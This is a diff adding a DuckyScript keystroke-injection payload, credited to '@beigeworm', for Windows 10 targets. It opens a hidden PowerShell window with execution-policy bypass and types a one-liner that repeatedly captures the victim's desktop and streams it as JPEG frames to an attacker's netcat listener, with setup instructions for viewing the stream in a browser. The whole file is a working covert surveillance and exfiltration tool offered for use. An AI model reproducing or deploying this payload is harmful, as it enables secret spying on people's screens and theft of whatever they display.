@@ -1,0 +1,22 @@
+REM Title: Beigeworm's Desktop Screenshare Through Netcat 
+REM Author: @beigeworm
+REM Description: This script connects target computer with a netcat session to send a stream of the desktop to a browser window.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace YOUR_IP_HERE with your netcat attacker IP Address.
+REM Run script on target Windows system.
+REM On a Linux box use this command > nc -lvnp 9000 | nc -lvnp 8080 (Netcat is required)
+REM Then in a firefox browser (ONLY) on the Linux box > http://localhost:8080
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 4000
+STRING $IP = "YOUR_IP_ADDRESS_OR_DOMAIN";$PORT = "9000";while($true){try{Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;$socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp);$socket.Connect($IP,$PORT);function SendResponse($sock, $string){if($sock.Connected){$bytesSent = $sock.Send($string);if( $bytesSent -eq -1 ){}}};function SendStrResponse($sock, $string){if($sock.Connected){$bytesSent = $sock.Send([text.Encoding]::Ascii.GetBytes($string));if( $bytesSent -eq -1 ){}}};function SendHeader([net.sockets.socket] $sock,$length,$statusCode = "200 OK",$mimeHeader="text/html",$httpVersion="HTTP/1.1"){$response = "HTTP/1.1 $statusCode`r`n" + "Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n";SendStrResponse $sock $response}SendHeader $socket;while ($True){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g = [System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);$g.Dispose();$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();$str = "`n`n--boundary`n" + "Content-Type: image/jpeg`n" + "Content-Length: $length`n`n";SendStrResponse $socket $str;SendResponse $socket $Bytes}$MemoryStream.Close()}catch{Write-Error $_}};exit
+DELAY 500
+ENTER
